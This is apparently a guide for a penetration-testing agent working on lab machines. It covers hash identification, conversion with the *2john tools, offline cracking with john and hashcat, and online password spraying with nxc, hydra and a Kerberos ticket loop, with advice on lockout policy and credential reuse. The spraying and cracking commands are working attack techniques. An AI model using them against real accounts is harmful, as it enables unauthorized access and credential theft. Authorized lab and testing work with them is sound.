# Hash and credential cracking

Cracking is a support activity, not a phase. Reach for it when you hold a hash
you cannot use directly — never as a substitute for finding the plaintext
somewhere on disk, which is faster and more reliable.

## Identify before you crack

```bash
pwnloop x "hashid '<hash>'"
pwnloop x "hashcat --identify '<hash>'"
```

Getting the format wrong wastes the whole run. Common shapes:

| prefix / shape | what it is | john format | hashcat mode |
|---|---|---|---|
| `$2y$` / `$2a$` | bcrypt | `bcrypt` | 3200 |
| `$6$` | sha512crypt (`/etc/shadow`) | `sha512crypt` | 1800 |
| `$1$` | md5crypt | `md5crypt` | 500 |
| `$y$` | yescrypt (modern shadow) | `crypt` | — |
| 32 hex | MD5 or NTLM — context decides | `raw-md5` / `nt` | 0 / 1000 |
| `$krb5asrep$23$` | AS-REP roast | `krb5asrep` | 18200 |
| `$krb5tgs$23$` | Kerberoast | `krb5tgs` | 13100 |
| `user::DOMAIN:...` | NetNTLMv2 | `netntlmv2` | 5600 |
| `$sshng$` | SSH private key | `ssh` | 22921 |
| `$office$` / `$zip2$` | Office / ZIP archive | `office` / `zip` | 9600 / 13600 |

## The `*2john` family

Anything with a password becomes a crackable hash first:

```bash
pwnloop x "ssh2john id_rsa      > k.hash"
pwnloop x "zip2john secret.zip  > z.hash"
pwnloop x "rar2john secret.rar  > r.hash"
pwnloop x "keepass2john db.kdbx > kp.hash"
pwnloop x "office2john doc.xlsx > o.hash"
pwnloop x "gpg2john key.asc     > g.hash"
pwnloop x "pdf2john file.pdf    > p.hash"
```

## Running it

```bash
pwnloop x "john --format=<fmt> --wordlist=/usr/share/wordlists/rockyou.txt h.hash"
pwnloop x "john --show --format=<fmt> h.hash"
pwnloop x "hashcat -m <mode> -a 0 h.hash /usr/share/wordlists/rockyou.txt"
```

The container has no GPU, so hashcat runs on CPU. For anything slow (bcrypt,
sha512crypt) that is a reason to think harder rather than wait: on a lab box, a
hash that will not fall to rockyou in five minutes is usually not the intended
path.

## Strategy, in order

1. **rockyou straight.** Most lab passwords are in it. Five minutes, no rules.
2. **Rules on rockyou.** `--rules=best64` (john) or `-r rules/best64.rule`
   (hashcat) catches the `Password1!` shape.
3. **A targeted wordlist.** Words from the machine itself beat any generic list —
   company name, product names, usernames, strings from the web app:
   ```bash
   pwnloop x "cewl -d 3 -m 6 http://machine.htb -w /engagements/$NAME/loot/site.txt"
   pwnloop x "john --wordlist=/engagements/$NAME/loot/site.txt --rules=best64 h.hash"
   ```
4. **Mask attack**, when you know the shape (`Summer2024!`):
   ```bash
   pwnloop x "hashcat -m <mode> -a 3 h.hash '?u?l?l?l?l?l?d?d?d?d?s'"
   ```
5. **Stop.** Three failed strategies means the hash is not the way in. Go back
   to enumeration.

## Online attacks

Spraying is usually right; brute force usually is not. One password against
every user beats every password against one user, and it does not lock accounts
if you respect the policy.

```bash
pwnloop x "nxc smb $T -u users.txt -p 'Winter2025!' --continue-on-success"
pwnloop x "hydra -L users.txt -p 'Winter2025!' ssh://$T -t 4"
pwnloop x "hydra -l admin -P /usr/share/wordlists/rockyou.txt $T http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'"
```

Check the lockout policy first (`nxc smb $T -u u -p p --pass-pol`).

**When the policy is unreadable — which is the normal case before you hold any
credential — spray one password per account per window, not a list.** The
threshold on a hardened domain can be three. Kerberos reports a locked account as
`KDC_ERR_CLIENT_REVOKED`, the same code it uses for a disabled account, so you
only learn the limit by crossing it. And a locked account is unusable by the
*intended* path as well, so this turns a delay into a dead engagement until the
lockout window expires or the box is reset.

```bash
# acceptable without a policy: one candidate, all accounts, then stop and reassess
for u in $(cat users.txt); do
  pwnloop x "faketime \"\$FT\" impacket-getTGT dom.htb/$u:'OneCandidate1' -dc-ip $T" 2>&1 \
    | grep -E 'Saving ticket|KDC_ERR_'
done
```

Never brute force SSH as root on a lab box — it is not the intended path and it
is noisy enough to disrupt other users of a shared network.

## After a crack

Every recovered plaintext goes into the ledger's credential table and is then
tried against **every** service and **every** user on the box. Password reuse
resolves more lab machines than cracking itself does.
